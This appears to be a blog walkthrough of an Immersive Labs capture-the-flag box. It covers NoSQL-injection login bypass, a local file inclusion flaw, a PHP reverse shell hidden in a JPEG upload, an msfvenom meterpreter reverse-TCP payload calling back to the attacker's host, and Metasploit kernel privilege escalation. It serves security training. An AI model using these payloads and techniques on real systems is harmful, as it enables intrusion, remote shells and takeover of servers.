---
date: 2025-03-11
categories: [CTF, ImmersiveLabs]
title: "IML - MongoDB NoSQL Injection"
tags: ['gobuster', 'linux', 'privilege escalation', 'python', 'rce', 'reverse shell', 'sqli', 'mongodb', 'nosqli']

description: "MongoDB NoSQL Injection - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - MongoDB NoSQL Injection

- Scan:

![image1](../resources/dc68505ba0864de89dcbc29127f8388e.png)

- Going to Port 80:

![image2](../resources/a7898c43ea7041698d258cb4e54b8357.png)

- We get a Login page and since this box is a MongoDB box, we can assume this is NoSqli

- Looking on:
<https://book.hacktricks.xyz/pentesting-web/nosql-injection>


![image3](../resources/c9def18806cf4472be56dc2ece822dd4.png)

**username\[\$ne\]=toto&password\[\$ne\]=toto**

- We need to see how the server crafts its authentication
- Open Burp Suite and capture the traffic from a login


![image4](../resources/a27c94f24a8c41c0afcd125882cd4ae2.png)

- Send this to the Repeater and change the authentication line

![image5](../resources/bfa8a8a7fb6e41628d11a6e18b6a68e9.png)

- Send it off and look at the Response (If this doesn't work - reset machine)

![image6](../resources/8bf395c7e7504e80aa048e02d2b92711.png)

**admin : Superhardpassword**

- Login with the credentials


![image7](../resources/d6631dba9b19474980bb6031b286edec.png)

- After trying to upload non jpeg files with a .jpeg extension and getting FAILED everytime, it's time to consider something else.
The jpeg header

- Since this Kali machine is closed off from the internet, we can search the machine itself for a jpeg image file:

```bash
find / -type f -name "\*.jpeg" 2>/dev/null

```

![image8](../resources/29bf84d6e48f48ca8ddf5362ec7eda7d.png)


![image9](../resources/7ef1dab00d0341a0a00afe4ac8944f61.png)

- Upload the thumbnail.jpeg and we get success:

![image10](../resources/fec7fe7f170c4c9c90b943774540a542.png)

- Through testing - all it needs to be successful is to have .jpeg at the end and for the data to start with:

![image11](../resources/b65bc279152b4a6293f90fb5cee5dc8b.png)

As show here:


![image12](../resources/26d3d3be75984cdf99a8f9e6ad2e5558.png)

- We can bruteforce for directories to see if we can execute the file (if we uploaded something malicious):

```bash
gobuster dir -u http://10.102.114.88 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt

```

![image13](../resources/61b9f6553bbf475e903c13677738c706.png)

- In /img:

![image14](../resources/a3527fc433964ac187cef8147bededf5.png)

- As this didn't lead to anything. I did another scan but with extensions this time:

```bash
gobuster dir -u http://10.102.114.88 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x .php

```

![image15](../resources/e1c51a5287f84c94bb2851f546978d20.png)

- If we look at /test/php:

![image16](../resources/3a0220dc3cff4b11a1e1686ba6e89040.png)

- This is a LFI vulnerability:

![image17](../resources/8c9ca2bf342d4c53b31d3ee9b801d5a7.png)

We can access some of the mongodb file like mongod.conf and mongod.log


![image18](../resources/5200828d9e1c4f93a6a3909c7a0b0ba1.png)

As well as check what apps are running - /proc/self/cmdline


![image19](../resources/299d41fb79944563858602dc2d51812d.png)
- We can also see if we can get any ssh private keys
- But that didn't give much

- We can get to the /img directory (where the uploaded images were stored):

![image20](../resources/7aab26b12e66490cae891130a80b43a0.png)

- So the way I got this to work is:

- Upload a legitimate .jpg file
- Capture the request in Burp
- Send to Repeater

- Now remove all the jpeg data, **apart** from the first (JFIF) line
- Paste in the php reverse shell code under this line
(I used pentestmonkey's script - <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>)

- Also rename the filename so it ends with **.php.jpg**

- So it looks like this:

![image21](../resources/0e6e05be2b5a40918d63673f96224047.png)

Don't upload the php directly, and then try and add the JFIF line afterwards - it doesn't recognize it and will fail

- Send that request and you should get Successful

- Set up a nc listener on the port you specified in the script

- And in a new Burp request (captured from the LFI):
Go to /var/www/html/img/**\<image_name\>**.php.jpg


![image22](../resources/b7915beb3bbf44f88e8d9ed613b3fc83.png)

- And we got a shell:

![image23](../resources/eef72054242e4fb1b669d0d17cbdc442.png)

- Upgrade the shell:
/usr/bin/script -qc /bin/bash /dev/null

**<u>Priv Esc</u>**
- Querying MongoDB didn't give anything:

![image24](../resources/e334e020bbd54d808d8b9bca8b46f62e.png)

- After lots of enumerating - found nothing so to get root I did:

- Created a meterpreter payload:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.102.143.238 LPORT=8881 -f elf -o reverse.elf

```

![image25](../resources/0aedcd2630bb4e57a534c7bb2a975d38.png)

- Uploaded the payload to the target with python server and curl

- Once I got the meterpreter session back, I used the module - **multi/recon/local_exploit_suggester** to give me potential priv esc modules:

![image26](../resources/b93bca4bf16d4288883f1cd8e6f5a616.png)

- I then used the module - **exploit/linux/local/bpf_sign_extension_priv_esc** to get root and get the flag:

![image27](../resources/ade1d27ea346404fbd1956b4e57081f0.png)
